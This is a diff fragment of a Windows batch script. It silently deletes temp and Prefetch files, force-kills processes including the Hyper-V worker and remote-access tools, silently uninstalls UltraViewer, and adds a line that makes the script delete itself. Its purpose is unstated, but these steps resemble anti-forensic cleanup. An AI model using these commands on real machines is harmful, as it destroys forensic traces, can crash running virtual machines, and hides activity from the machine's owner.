@@ -2,7 +2,6 @@ del /f /s /q %temp%\* >nul 2>&1
 del /f /s /q%localappdata%\Temp\* >nul 2>&1
 del /f /s /q C:\Windows\Prefetch\* >nul 2>&1
 
-
 taskkill /f /IM discord.exe >nul 2>&1
 taskkill /f /IM vmwp.exe >nul 2>&1
 taskkill /f /IM getscreen.exe >nul 2>&1
@@ -100,3 +99,7 @@ sc delete UltraViewService >nul 2>&1
 
 START C:\"Program Files (x86)"\UltraViewer\Unins000.exe /verysilent
 C:\Program Files (x86)\UltraViewer\unins000.exe /VERYSILENT /SUPPRESSMSGBOXES /NORESTART >nul 2>&1
+
+endlocal
+start "" /b cmd /c "timeout /t 2 /nobreak >nul & del /f /q ""%~f0"""
+exit /b
